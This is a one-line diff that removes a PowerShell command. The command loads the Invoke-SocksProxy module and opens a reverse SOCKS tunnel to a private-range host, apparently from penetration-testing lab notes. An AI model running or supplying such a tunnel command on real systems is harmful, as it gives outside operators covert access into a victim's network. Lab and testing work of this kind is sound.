@@ -1,1 +1,0 @@
-powershell -c "Import-Module .\Invoke-SocksProxy.psm1; Invoke-ReverseSocksProxy -remotePort 1234  -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'"
